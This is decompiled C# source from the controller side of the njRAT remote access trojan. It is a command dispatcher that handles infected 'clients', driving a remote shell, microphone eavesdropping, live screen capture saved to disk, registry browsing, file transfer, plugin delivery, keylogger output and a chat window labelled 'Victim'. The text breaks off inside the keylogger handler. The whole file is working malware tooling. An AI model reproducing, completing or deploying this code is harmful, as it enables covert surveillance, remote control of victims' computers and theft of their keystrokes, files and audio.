using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using NJRAT.My;
using NJRAT.My.Resources;
using NJRAT.njRAT;
using NJRAT.NJRAT;
using WinMM;

namespace NJRAT
{
	// Token: 0x02000029 RID: 41
	[StandardModule]
	internal sealed class Class7
	{
		// Token: 0x06000572 RID: 1394 RVA: 0x0013AFA0 File Offset: 0x001393A0
		[DebuggerNonUserCode]
		public Class7()
		{
		}

		// Token: 0x06000574 RID: 1396 RVA: 0x0013B07C File Offset: 0x0013947C
		public static Class7.Class9 smethod_0(string string_2, string string_3)
		{
			bool flag = string_2 != null;
			if (flag)
			{
				try
				{
					foreach (Class7.Class9 @class in Class7.list_1)
					{
						flag = Operators.CompareString(@class.string_0, string_2.ToLower(), false) == 0;
						if (flag)
						{
							return @class;
						}
					}
				}
				finally
				{
					
				}
			}
			flag = string_3 != null;
			if (flag)
			{
				try
				{
					foreach (Class7.Class9 class2 in Class7.list_1)
					{
						flag = Operators.CompareString(class2.string_1, string_3, false) == 0;
						if (flag)
						{
							return class2;
						}
					}
				}
				finally
				{

				}
			}
			return null;
		}

		// Token: 0x06000575 RID: 1397 RVA: 0x0013B168 File Offset: 0x00139568
		public static object smethod_1(DataGridViewRow dataGridViewRow_0)
		{
			object obj;
			try
			{
				obj = RuntimeHelpers.GetObjectValue((dataGridViewRow_0 != null) ? ((dataGridViewRow_0.Tag != null) ? Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject("[", RuntimeHelpers.GetObjectValue(dataGridViewRow_0.Cells[Class7.int_0].Value))), "/")), RuntimeHelpers.GetObjectValue(dataGridViewRow_0.Cells[Class7.int_3].Value))), "/")), RuntimeHelpers.GetObjectValue(dataGridViewRow_0.Cells[Class7.int_7].Value))), "]") : "?") : "?");
			}
			catch (Exception ex)
			{
				obj = "?";
			}
			return obj;
		}

		// Token: 0x06000576 RID: 1398 RVA: 0x0013B270 File Offset: 0x00139670
		public static bool smethod_2(Client client_0, Class7.Class9 class9_0, bool bool_1)
		{
			try
			{
				string text;
				if (bool_1)
				{
					text = "ret" + Class7.string_1 + class9_0.string_1 + Class7.string_1;
				}
				else
				{
					text = string.Concat(new string[]
					{
						"inv",
						Class7.string_1,
						class9_0.string_1,
						Class7.string_1,
						client_0.ip(),
						Class7.string_1
					});
				}
				MemoryStream memoryStream = new MemoryStream();
				memoryStream.Write(Class6.smethod_11(ref text), 0, text.Length);
				bool flag = !client_0.plg.Contains(class9_0.string_1);
				if (flag)
				{
					memoryStream.Write(class9_0.byte_0, 0, class9_0.byte_0.Length);
				}
				else
				{
					memoryStream.WriteByte(40);
				}
				client_0.Send(memoryStream.ToArray());
				return true;
			}
			catch (Exception ex)
			{
			}
			return false;
		}

		// Token: 0x06000577 RID: 1399 RVA: 0x0013B390 File Offset: 0x00139790
		public static Form smethod_3(string string_2)
		{
			return MyProject.Application.OpenForms[string_2];
		}

		// Token: 0x06000578 RID: 1400 RVA: 0x0013B3B4 File Offset: 0x001397B4
		public static void smethod_4(object object_0)
		{
			IEnumerator enumerator = Class7.form1_0.L1.SelectedRows.GetEnumerator();
			enumerator.Reset();
			bool flag = NewLateBinding.LateIndexGet(RuntimeHelpers.GetObjectValue(object_0), new object[] { RuntimeHelpers.GetObjectValue(0) }, null) is string;
			byte[] array2;
			if (flag)
			{
				string text = Conversions.ToString(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(RuntimeHelpers.GetObjectValue(object_0), new object[] { RuntimeHelpers.GetObjectValue(0) }, null)));
				byte[] array = Class6.smethod_11(ref text);
				NewLateBinding.LateIndexSetComplex(RuntimeHelpers.GetObjectValue(object_0), new object[]
				{
					RuntimeHelpers.GetObjectValue(0),
					text
				}, null, true, false);
				array2 = array;
			}
			else
			{
				array2 = (byte[])NewLateBinding.LateIndexGet(RuntimeHelpers.GetObjectValue(object_0), new object[] { RuntimeHelpers.GetObjectValue(0) }, null);
			}
			while (enumerator.MoveNext())
			{
				object obj = enumerator.Current;
				DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
				((Client)dataGridViewRow.Tag).Send(array2);
				DataGridViewCellStyle defaultCellStyle = dataGridViewRow.DefaultCellStyle;
				object objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(RuntimeHelpers.GetObjectValue(object_0), new object[] { RuntimeHelpers.GetObjectValue(1) }, null));
				Color color;
				if (objectValue == null)
				{
					Color color2 = Color.DarkBlue;
					color = color2;
				}
				else
				{
					object obj2 = objectValue;
					Color color3 = Color.DarkBlue;
					color = ((obj2 != null) ? ((Color)obj2) : color3);
				}
				Color color4 = color;
				defaultCellStyle.ForeColor = color4;
			}
		}

		// Token: 0x06000579 RID: 1401 RVA: 0x0013B540 File Offset: 0x00139940
		public static void smethod_5(object object_0)
		{
			Client client = (Client)NewLateBinding.LateIndexGet(RuntimeHelpers.GetObjectValue(object_0), new object[] { RuntimeHelpers.GetObjectValue(0) }, null);
			byte[] array = (byte[])NewLateBinding.LateIndexGet(RuntimeHelpers.GetObjectValue(object_0), new object[] { RuntimeHelpers.GetObjectValue(1) }, null);
			string[] array2 = Strings.Split(Class6.smethod_12(ref array), Class7.string_1, -1, CompareMethod.Binary);
			try
			{
				string text = array2[0];
				bool flag = Operators.CompareString(text, "Ex", false) == 0;
				if (flag)
				{
					Manager manager = (Manager)Class7.smethod_3("m" + client.ip());
					flag = manager == null;
					if (!flag)
					{
						manager.SL.Text = array2[1];
						flag = !array2[1].StartsWith("rs:!-->");
						if (!flag)
						{
							manager.shStarted = 0;
						}
					}
				}
				else
				{
					flag = Operators.CompareString(text, "srv", false) == 0;
					if (flag)
					{
						Manager manager2 = (Manager)Class7.smethod_3("m" + client.ip());
						flag = manager2 == null || Operators.CompareString(array2[1], "~", false) != 0;
						if (!flag)
						{
							List<string> list = new List<string>();
							List<ListViewItem> list2 = new List<ListViewItem>();
							int num = 2;
							int num2 = array2.Length - 1;
							for (int i = num; i <= num2; i++)
							{
								string[] array3 = Strings.Split(array2[i], "[,]", -1, CompareMethod.Binary);
								list.Add(array3[0].ToLower());
								flag = manager2.LSRV.Items.ContainsKey(array3[0]);
								if (flag)
								{
									ListViewItem listViewItem = manager2.LSRV.Items[array3[0]];
									listViewItem.SubItems[3].Text = array3[3];
									listViewItem.SubItems[4].Text = array3[4];
								}
								else
								{
									ListViewItem listViewItem2 = new ListViewItem(array3[0]);
									int num3 = 1;
									int num4 = array3.Length - 1;
									for (int j = num3; j <= num4; j++)
									{
										listViewItem2.SubItems.Add(array3[j]);
									}
									listViewItem2.Name = array3[0];
									list2.Add(listViewItem2);
									flag = list2.Count > 20;
									if (flag)
									{
										manager2.LSRV.Items.AddRange(list2.ToArray());
										list2.Clear();
									}
								}
							}
							flag = list2.Count > 0;
							if (flag)
							{
								manager2.LSRV.Items.AddRange(list2.ToArray());
								list2.Clear();
							}
							List<string> list3 = new List<string>();
							try
							{
								try
								{
									foreach (object obj in manager2.LSRV.Items)
									{
										ListViewItem listViewItem3 = (ListViewItem)obj;
										flag = !list.Contains(listViewItem3.Text.ToLower());
										if (flag)
										{
											list3.Add(listViewItem3.Text);
										}
									}
								}
								finally
								{
									
								}
							}
							finally
							{
								
							}
							try
							{
								foreach (string text2 in list3)
								{
									manager2.LSRV.Items.RemoveByKey(text2);
								}
							}
							finally
							{
								
							}
							manager2.srvNxt = true;
							flag = !manager2.SrvFX;
							if (!flag)
							{
								manager2.SrvFX = false;
								manager2.LSRV.method_3();
							}
						}
					}
					else
					{
						flag = Operators.CompareString(text, "tcp", false) == 0;
						if (flag)
						{
							Manager manager3 = (Manager)Class7.smethod_3("m" + client.ip());
							flag = manager3 == null;
							if (!flag)
							{
								ToolStripProgressBar pr = manager3.pr;
								lock (pr)
								{
									string text3 = array2[1];
									flag = Operators.CompareString(text3, "~", false) == 0;
									if (flag)
									{
										string[] array4 = Strings.Split(array2[2], "*", -1, CompareMethod.Binary);
										manager3.pr.Value = 0;
										manager3.pr.Maximum = array4.Length;
										List<ListViewItem> list4 = new List<ListViewItem>();
										int num5 = 0;
										int num6 = array4.Length - 1;
										for (int k = num5; k <= num6; k++)
										{
											string[] array5 = Strings.Split(array4[k], ",", -1, CompareMethod.Binary);
											flag = manager3.LTCP.Items.ContainsKey(array5[0] + array5[1]);
											if (flag)
											{
												ListViewItem listViewItem4 = manager3.LTCP.Items[array5[0] + array5[1]];
												listViewItem4.SubItems[4].Text = ((TcpState)Conversions.ToInteger(array5[2])).ToString();
												Color foreColor = listViewItem4.ForeColor;
												switch (Conversions.ToInteger(array5[2]))
												{
												case 1:
												case 8:
												case 9:
												case 11:
												case 12:
													listViewItem4.ForeColor = Color.Red;
													break;
												case 4:
													listViewItem4.ForeColor = Color.YellowGreen;
													break;
												case 5:
													listViewItem4.ForeColor = Color.LimeGreen;
													break;
												}
											}
											else
											{
												ListViewItem listViewItem5 = new ListViewItem(array5[0].Split(new char[] { ':' })[0]);
												listViewItem5.Name = array5[0] + array5[1];
												listViewItem5.Tag = array5[0] + array5[1];
												listViewItem5.SubItems.Add(array5[0].Split(new char[] { ':' })[1]);
												listViewItem5.SubItems.Add(array5[1].Split(new char[] { ':' })[0]);
												listViewItem5.SubItems.Add(array5[1].Split(new char[] { ':' })[1]);
												listViewItem5.SubItems.Add(((TcpState)Conversions.ToInteger(array5[2])).ToString());
												listViewItem5.SubItems.Add(array5[3]);
												switch (Conversions.ToInteger(array5[2]))
												{
												case 1:
												case 8:
												case 9:
												case 11:
												case 12:
													listViewItem5.ForeColor = Color.Red;
													break;
												case 3:
												case 4:
													listViewItem5.ForeColor = Color.YellowGreen;
													break;
												case 5:
													listViewItem5.ForeColor = Color.LimeGreen;
													break;
												}
												list4.Add(listViewItem5);
												flag = list4.Count > 20;
												if (flag)
												{
													manager3.LTCP.Items.AddRange(list4.ToArray());
													list4.Clear();
													ColumnHeader columnHeader_ = manager3.LTCP.columnHeader_0;
													flag = columnHeader_ == null;
													if (flag)
													{
														manager3.LTCP.GClass9_ColumnClick(manager3.LTCP, new ColumnClickEventArgs(0));
													}
													else
													{
														columnHeader_.Tag = RuntimeHelpers.GetObjectValue((!Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(columnHeader_.Tag), "+", false)) ? ((!Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(columnHeader_.Tag), "-", false)) ? "-" : "+") : "-");
														manager3.LTCP.GClass9_ColumnClick(manager3.LTCP, new ColumnClickEventArgs(columnHeader_.Index));
													}
												}
											}
										}
										flag = manager3.TCPFX;
										if (flag)
										{
											manager3.LTCP.method_3();
											manager3.TCPFX = false;
										}
										flag = list4.Count > 0;
										if (flag)
										{
											manager3.LTCP.Items.AddRange(list4.ToArray());
											list4.Clear();
											ColumnHeader columnHeader_2 = manager3.LTCP.columnHeader_0;
											flag = columnHeader_2 == null;
											if (flag)
											{
												manager3.LTCP.GClass9_ColumnClick(manager3.LTCP, new ColumnClickEventArgs(0));
											}
											else
											{
												columnHeader_2.Tag = RuntimeHelpers.GetObjectValue((!Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(columnHeader_2.Tag), "+", false)) ? ((!Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(columnHeader_2.Tag), "-", false)) ? "-" : "+") : "-");
												manager3.LTCP.GClass9_ColumnClick(manager3.LTCP, new ColumnClickEventArgs(columnHeader_2.Index));
											}
										}
										manager3.TCPNXT = true;
									}
									else
									{
										flag = Operators.CompareString(text3, "RM", false) == 0;
										if (flag)
										{
											int num7 = 2;
											int num8 = array2.Length - 1;
											for (int l = num7; l <= num8; l++)
											{
												manager3.LTCP.Items.RemoveByKey(array2[l]);
											}
										}
										else
										{
											flag = Operators.CompareString(text3, "ER", false) != 0;
											if (!flag)
											{
												manager3.SL.Text = array2[2];
											}
										}
									}
								}
							}
						}
						else
						{
							flag = Operators.CompareString(text, "MIC", false) == 0;
							if (flag)
							{
								bool flag2 = client.osk == null;
								if (flag2)
								{
									client.isPL = true;
									try
									{
										client.osk = Class7.sk_0.GetClient(array2[1]);
									}
									catch (Exception ex)
									{
										client.CN = false;
									}
								}
								flag2 = Class7.form1_0.InvokeRequired;
								if (flag2)
								{
									Class7.form1_0.Invoke(new Class7.Delegate0(Class7.smethod_5), new object[] { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_0))) });
								}
								else
								{
									Mic mic = (Mic)Class7.smethod_3("mic" + client.ip());
									string text4 = array2[2];
									flag2 = Operators.CompareString(text4, "~", false) == 0;
									if (flag2)
									{
										flag = mic != null;
										if (!flag)
										{
											Mic mic2 = new Mic();
											mic2.Name = "mic" + client.ip();
											mic2.sk = client;
											mic2.osk = client.osk;
											int num9 = 3;
											int num10 = array2.Length - 1;
											for (int m = num9; m <= num10; m++)
											{
												mic2.ComboBox1.Items.Add(array2[m]);
											}
											mic2.Show();
										}
									}
									else
									{
										flag2 = Operators.CompareString(text4, "!", false) == 0;
										if (flag2)
										{
											flag = mic == null;
											if (flag)
											{
												client.CN = false;
											}
											else
											{
												byte[] array6 = (byte[])NewLateBinding.LateIndexGet(Class6.smethod_9(array, array2[3] + Class7.string_1), new object[] { RuntimeHelpers.GetObjectValue(1) }, null);
												flag2 = array6[0] == 31;
												if (flag2)
												{
													byte[] array7 = array6;
													bool flag3 = false;
													bool flag4 = flag3;
													array6 = Class6.smethod_8(array7, ref flag4);
												}
												mic.Text = Class6.smethod_17((long)array6.Length) + " " + mic.QQ;
												flag2 = Conversions.ToInteger(array2[3]) == 0;
												if (flag2)
												{
													Class7.waveOut_0.Write(array6);
												}
												else
												{
													Class7.waveOut_1.Write(array6);
												}
											}
										}
										else
										{
											flag2 = Operators.CompareString(text4, "ER", false) != 0;
											if (!flag2)
											{
												flag2 = mic == null;
												if (flag2)
												{
													client.CN = false;
												}
												else
												{
													mic.ComboBox1.Enabled = true;
													mic.ComboBox2.Enabled = true;
													mic.Button1.Text = "Start";
												}
											}
										}
									}
								}
							}
							else
							{
								bool flag2 = Operators.CompareString(text, "get", false) == 0;
								if (flag2)
								{
									client.isPL = true;
									client.t.Dispose();
									client.CN = false;
									client.NoPing = true;
									up up = (up)Class7.smethod_3(array2[1] + array2[2]);
									flag2 = up == null;
									if (flag2)
									{
										client.Close();
									}
									else
									{
										up.sk = client;
										int num11 = 0;
										client.ClientI.SendBufferSize = 524288;
										try
										{
											while (num11 != up.SZ)
											{
												flag2 = !up.Closinge;
												if (!flag2)
												{
													goto IL_F4F;
												}
												byte[] array8 = new byte[10241];
												int num12 = up.FS.Read(array8, 0, array8.Length);
												client.ClientI.Client.Poll(-1, SelectMode.SelectWrite);
												client.ClientI.Client.Send(array8, 0, num12, SocketFlags.None);
												num11 += num12;
												Class7.long_0 += (long)num12;
												ProgressBar progressBar = up.ProgressBar1;
												progressBar.Value += num12;
											}
											up.Close();
										}
										catch (Exception ex2)
										{
											try
											{
												up.Text = "Connection lost";
												up.Lv1.ForeColor = Color.Red;
											}
											catch (Exception ex3)
											{
											}
										}
										IL_F4F:
										client.Close();
									}
								}
								else
								{
									flag2 = Operators.CompareString(text, "post+", false) == 0;
									if (flag2)
									{
										client.isPL = true;
										DW dw = new DW();
										dw.FN = array2[1];
										dw.SZ = Conversions.ToInteger(array2[2]);
										dw.c = client;
										dw.osk = client.osk;
										dw.Name = dw.osk.ip() + array2[1];
										dw.Show();
									}
									else
									{
										flag2 = Operators.CompareString(text, "post", false) == 0;
										if (flag2)
										{
											client.osk = Class7.sk_0.GetClient(array2[3]);
											try
											{
												client.t.Dispose();
												client.CN = false;
												client.NoPing = true;
												object objectValue = RuntimeHelpers.GetObjectValue(object_0);
												object[] array9 = new object[]
												{
													RuntimeHelpers.GetObjectValue(1),
													null
												};
												object[] array10 = array9;
												int num13 = 1;
												string text5 = string.Concat(new string[]
												{
													"post+",
													Class7.string_1,
													array2[1],
													Class7.string_1,
													array2[2],
													Class7.string_1,
													array2[3]
												});
												byte[] array11 = Class6.smethod_11(ref text5);
												array10[num13] = array11;
												object[] array12 = array9;
												object obj2 = null;
												NewLateBinding.LateIndexSet(RuntimeHelpers.GetObjectValue(objectValue), array12, (string[])obj2);
												Class7.form1_0.Invoke(new Class7.Delegate0(Class7.smethod_5), new object[] { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_0))) });
												int num14 = 0;
												while (Class7.smethod_3(array2[3] + array2[1]) == null)
												{
													num14++;
													flag2 = num14 == 1000;
													if (flag2)
													{
														return;
													}
													Thread.Sleep(10);
												}
												Socket client2 = client.ClientI.Client;
												text5 = "ok";
												byte[] array13 = Class6.smethod_11(ref text5);
												int num15 = 0;
												int num16 = 2;
												int num17 = 0;
												client2.Send(array13, num15, num16, (SocketFlags)num17);
												client.ClientI.Client.ReceiveBufferSize = 1048576;
												Class7.long_0 += 2L;
												byte[] array14 = new byte[1025];
												DW dw2 = (DW)Class7.smethod_3(array2[3] + array2[1]);
												int num18 = 0;
												try
												{
													for (;;)
													{
														byte[] array15 = new byte[1048577];
														client.ClientI.Client.Poll(-1, SelectMode.SelectRead);
														int num19 = client.ClientI.Client.Receive(array15, 0, array15.Length, SocketFlags.None);
														dw2.FS.Write(array15, 0, num19);
														Class7.long_1 += (long)num19;
														num18 += num19;
														ProgressBar progressBar2 = dw2.ProgressBar1;
														progressBar2.Value += num19;
														dw2.FS.Flush();
														flag2 = num18 != dw2.SZ;
														if (!flag2)
														{
															break;
														}
														Thread.Sleep(1);
													}
													dw2.Button1.Enabled = false;
													dw2.FS.Close();
													dw2.FS.Dispose();
													flag2 = File.Exists(dw2.folder);
													if (flag2)
													{
														File.Delete(dw2.folder);
													}
													File.Move(dw2.tmp, dw2.folder);
													dw2.Close();
												}
												catch (Exception ex4)
												{
													dw2.Text = "connection lost";
													dw2.ForeColor = Color.Red;
												}
											}
											catch (Exception ex5)
											{
											}
											client.Close();
										}
										else
										{
											flag2 = Operators.CompareString(text, "RG", false) == 0;
											if (flag2)
											{
												flag = Class7.form1_0.InvokeRequired;
												if (flag)
												{
													Class7.form1_0.Invoke(new Class7.Delegate0(Class7.smethod_5), new object[] { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_0))) });
												}
												else
												{
													Manager manager4 = (Manager)Class7.smethod_3("m" + client.ip());
													ToolStripProgressBar pr2 = manager4.pr;
													lock (pr2)
													{
														string text6 = array2[1];
														flag2 = Operators.CompareString(text6, "ER", false) == 0;
														if (flag2)
														{
															manager4.RGk.Enabled = true;
															manager4.RGLIST.Enabled = true;
															manager4.SL.Text = Class6.smethod_16(array2[2]);
														}
														else
														{
															flag2 = Operators.CompareString(text6, "~", false) != 0;
															if (!flag2)
															{
																manager4.RGk.Enabled = true;
																manager4.RGLIST.Enabled = true;
																TreeNodeCollection nodes = manager4.RGk.Nodes;
																TreeNode treeNode = Class6.smethod_7(array2[2], manager4.RGk.Nodes);
																List<string> list5 = new List<string>();
																flag2 = manager4.RGk.SelectedNode == treeNode;
																if (flag2)
																{
																	manager4.RGLIST.Items.Clear();
																}
																flag2 = manager4.RGCH.Contains(array2[2]);
																Manager.GClass13 gclass;
																if (flag2)
																{
																	gclass = (Manager.GClass13)manager4.RGCH[array2[2]];
																	gclass.list_0.Clear();
																	gclass.list_1.Clear();
																}
																else
																{
																	gclass = new Manager.GClass13();
																	gclass.string_0 = array2[2];
																	manager4.RGCH.Add(gclass, array2[2], null, null);
																}
																string[] array16 = Strings.Split(array2[3], "[,]", -1, CompareMethod.Binary);
																manager4.pr.Value = 0;
																manager4.pr.Maximum = array16.Length;
																foreach (string text7 in array16)
																{
																	flag2 = Operators.CompareString(text7, string.Empty, false) != 0;
																	if (flag2)
																	{
																		string[] array18 = Strings.Split(text7, "[;]", -1, CompareMethod.Binary);
																		try
																		{
																			ToolStripProgressBar pr3 = manager4.pr;
																			pr3.Value++;
																			flag2 = array18.Length > 1;
																			if (flag2)
																			{
																				flag = manager4.RGk.SelectedNode == treeNode;
																				if (flag)
																				{
																					ListViewItem listViewItem6 = manager4.RGLIST.Items.Add(array18[0]);
																					listViewItem6.SubItems.Add(array18[1]);
																					listViewItem6.SubItems.Add(array18[2]);
																					listViewItem6.ImageIndex = ((Operators.CompareString(array18[1], "String", false) != 0) ? 2 : 1);
																				}
																				gclass.list_0.Add(array18);
																			}
																			else
																			{
																				gclass.list_1.Add(array18[0]);
																				treeNode.Nodes.Add(array18[0], array18[0]);
																				flag2 = !treeNode.Nodes.ContainsKey(array18[0]);
																				if (flag2)
																				{
																					list5.Add(array18[0]);
																				}
																			}
																		}
																		catch (Exception ex6)
																		{
																		}
																	}
																}
																try
																{
																	try
																	{
																		foreach (object obj3 in treeNode.Nodes)
																		{
																			TreeNode treeNode2 = (TreeNode)obj3;
																			flag2 = list5.Contains(treeNode2.Text);
																			if (flag2)
																			{
																				list5.Remove(treeNode2.Text);
																			}
																		}
																	}
																	finally
																	{
																		
																	}
																}
																finally
																{
																	
																}
																try
																{
																	foreach (string text8 in list5)
																	{
																		treeNode.Nodes.RemoveByKey(text8);
																	}
																}
																finally
																{
																	
																}
																flag2 = treeNode == manager4.RGk.SelectedNode;
																if (flag2)
																{
																	treeNode.Expand();
																}
																manager4.RGLIST.method_3();
																manager4.pr.Value = 0;
															}
														}
													}
												}
											}
											else
											{
												flag2 = Operators.CompareString(text, "rss", false) == 0;
												if (flag2)
												{
													Manager manager5 = (Manager)Class7.smethod_3("m" + client.ip());
													flag2 = manager5 == null;
													if (!flag2)
													{
														manager5.shStarted = 2;
														manager5.T2.ReadOnly = false;
														manager5.T2.BackColor = Color.Black;
													}
												}
												else
												{
													flag2 = Operators.CompareString(text, "rs", false) == 0;
													if (flag2)
													{
														Manager manager6 = (Manager)Class7.smethod_3("m" + client.ip());
														flag2 = manager6 == null;
														if (!flag2)
														{
															RichTextBox t = manager6.T1;
															lock (t)
															{
																manager6.T1.SelectionStart = manager6.T1.TextLength;
																manager6.T1.AppendText(Class6.smethod_16(array2[1].Replace("\r\n", string.Empty)) + "\r\n");
																manager6.T1.SelectionStart = manager6.T1.TextLength;
																manager6.T1.ScrollToCaret();
															}
														}
													}
													else
													{
														flag2 = Operators.CompareString(text, "rsc", false) == 0;
														if (flag2)
														{
															Manager manager7 = (Manager)Class7.smethod_3("m" + client.ip());
															flag2 = manager7 == null;
															if (!flag2)
															{
																manager7.T2.ReadOnly = true;
																manager7.T2.BackColor = Color.Gray;
																manager7.shStarted = 0;
															}
														}
														else
														{
															flag2 = Operators.CompareString(text, "PLG", false) == 0;
															if (flag2)
															{
																Class7.Class9 @class = Class7.smethod_0("plg.dll", null);
																MemoryStream memoryStream = new MemoryStream();
																string text9 = "PLG" + Class7.string_1;
																byte[] array19 = Class6.smethod_11(ref text9);
																memoryStream.Write(array19, 0, array19.Length);
																memoryStream.Write(@class.byte_0, 0, @class.byte_0.Length);
																client.Send(memoryStream.ToArray());
															}
															else
															{
																flag2 = Operators.CompareString(text, "sc~", false) == 0;
																if (flag2)
																{
																	flag = client.osk == null;
																	if (flag)
																	{
																		client.isPL = true;
																		try
																		{
																			client.osk = Class7.sk_0.GetClient(array2[1]);
																		}
																		catch (Exception ex7)
																		{
																			client.CN = false;
																		}
																	}
																	flag2 = Class7.form1_0.InvokeRequired;
																	if (flag2)
																	{
																		Class7.form1_0.Invoke(new Class7.Delegate0(Class7.smethod_5), new object[] { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_0))) });
																	}
																	else
																	{
																		flag2 = (sc)Class7.smethod_3("sc" + client.ip()) != null;
																		if (!flag2)
																		{
																			sc sc = new sc();
																			sc.osk = client.osk;
																			sc.sz = new Size(Conversions.ToInteger(array2[2]), Conversions.ToInteger(array2[3]));
																			sc.p.Image = null;
																			sc.Oimg = new Bitmap(sc.sz.Width, sc.sz.Height, PixelFormat.Format32bppPArgb);
																			sc.sk = client;
																			sc.Name = "sc" + client.ip();
																			sc.Show();
																		}
																	}
																}
																else
																{
																	flag2 = Operators.CompareString(text, "scPK", false) == 0;
																	if (flag2)
																	{
																		sc sc2 = (sc)Class7.smethod_3("sc" + array2[1]);
																		flag2 = sc2 == null;
																		if (flag2)
																		{
																			client.CN = false;
																		}
																		else
																		{
																			sc sc3 = sc2;
																			lock (sc3)
																			{
																				sc sc4 = sc2;
																				sc4.fps++;
																				sc2.pkt = (long)array.Length;
																				flag2 = array2[2].Length == 0;
																				if (!flag2)
																				{
																					Bitmap bitmap = (Bitmap)Image.FromStream(new MemoryStream((byte[])NewLateBinding.LateIndexGet(Class6.smethod_9(array, array2[2] + Class7.string_1), new object[] { RuntimeHelpers.GetObjectValue(1) }, null)));
																					flag2 = bitmap.Width == 0;
																					if (!flag2)
																					{
																						string[] array20 = Strings.Split(array2[2], "-", -1, CompareMethod.Binary);
																						string[] array21 = Strings.Split(array20[0], ",", -1, CompareMethod.Binary);
																						Size size = new Size(Conversions.ToInteger(array21[0]), Conversions.ToInteger(array21[1]));
																						int num20 = Conversions.ToInteger(array20[1]);
																						flag2 = sc2.Oimg.Size != size;
																						if (flag2)
																						{
																							sc2.Oimg = new Bitmap(size.Width, size.Height, PixelFormat.Format32bppPArgb);
																						}
																						PixelFormat pixelFormat = PixelFormat.Format32bppArgb;
																						int num21 = 0;
																						int num22 = 2;
																						int num23 = array20.Length - 1;
																						for (int num24 = num22; num24 <= num23; num24++)
																						{
																							string[] array22 = Strings.Split(array20[num24], ",", -1, CompareMethod.Binary);
																							Rectangle rectangle = new Rectangle(Conversions.ToInteger(array22[0]), Conversions.ToInteger(array22[1]), bitmap.Width, num20);
																							BitmapData bitmapData = sc2.Oimg.LockBits(rectangle, ImageLockMode.WriteOnly, pixelFormat);
																							Bitmap bitmap2 = bitmap;
																							Rectangle rectangle2 = new Rectangle(0, num21, rectangle.Width, rectangle.Height);
																							BitmapData bitmapData2 = bitmap2.LockBits(rectangle2, ImageLockMode.ReadOnly, pixelFormat);
																							byte[] array23 = new byte[Math.Abs(bitmapData.Stride) * bitmapData.Height - 1 + 1 - 1 + 1];
																							Class6.memcpy(bitmapData.Scan0, bitmapData2.Scan0, array23.Length);
																							sc2.Oimg.UnlockBits(bitmapData);
																							bitmap.UnlockBits(bitmapData2);
																							num21 += num20;
																						}
																						sc2.p.Image = (Image)sc2.Oimg.Clone();
																						flag2 = !sc2.CheckBox3.Checked;
																						if (!flag2)
																						{
																							try
																							{
																								sc2.Oimg.Save(sc2.Folder + DateAndTime.Now.ToString("yyMMddhhmmssfff") + ".jpg", ImageFormat.Jpeg);
																							}
																							catch (Exception ex8)
																							{
																							}
																						}
																					}
																				}
																			}
																		}
																	}
																	else
																	{
																		flag2 = Operators.CompareString(text, "CH", false) == 0;
																		if (flag2)
																		{
																			flag = client.osk == null;
																			if (flag)
																			{
																				client.isPL = true;
																				try
																				{
																					client.osk = Class7.sk_0.GetClient(array2[1]);
																				}
																				catch (Exception ex9)
																				{
																					client.CN = false;
																				}
																			}
																			flag2 = Class7.form1_0.InvokeRequired;
																			if (flag2)
																			{
																				Class7.form1_0.Invoke(new Class7.Delegate0(Class7.smethod_5), new object[] { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_0))) });
																			}
																			else
																			{
																				Chat chat = (Chat)Class7.smethod_3("ch" + client.ip());
																				string text10 = array2[2];
																				flag2 = Operators.CompareString(text10, "~", false) == 0;
																				if (flag2)
																				{
																					flag = chat != null;
																					if (!flag)
																					{
																						new Chat
																						{
																							Name = "ch" + client.ip(),
																							sk = client,
																							osk = client.osk,
																							T2 = 
																							{
																								Enabled = false
																							},
																							Button1 = 
																							{
																								Enabled = false
																							}
																						}.Show();
																					}
																				}
																				else
																				{
																					flag2 = Operators.CompareString(text10, "!", false) == 0;
																					if (flag2)
																					{
																						chat.T2.Enabled = true;
																						chat.Button1.Enabled = true;
																						Chat chat2 = chat;
																						lock (chat2)
																						{
																							chat.T1.AppendText("Connected ..\r\n");
																						}
																					}
																					else
																					{
																						flag2 = Operators.CompareString(text10, "@", false) != 0;
																						if (!flag2)
																						{
																							Chat chat3 = chat;
																							lock (chat3)
																							{
																								chat.T1.SelectionStart = chat.T1.TextLength;
																								chat.T1.SelectionFont = new Font(chat.T1.Font, FontStyle.Bold);
																								chat.T1.AppendText("Victim : ");
																								chat.T1.SelectionFont = chat.T1.Font;
																								chat.T1.AppendText(Class6.smethod_16(array2[3]) + "\r\n");
																								chat.T1.SelectionStart = chat.T1.TextLength;
																								chat.T1.ScrollToCaret();
																								try
																								{
																									Interaction.AppActivate(chat.Text);
																								}
																								catch (Exception ex10)
																								{
																								}
																							}
																						}
																					}
																				}
																			}
																		}
																		else
																		{
																			flag2 = Operators.CompareString(text, "kla", false) == 0;
																			if (flag2)
																			{
																				kl kl = (kl)Class7.smethod_3("kl" + client.ip());
																				kl kl2 = kl;
																				lock (kl2)
																				{
																					kl.T1.Clear();
																					string[] array24 = Strings.Split(Class6.smethod_16(array2[1]), "\r\n", -1, CompareMethod.Binary);
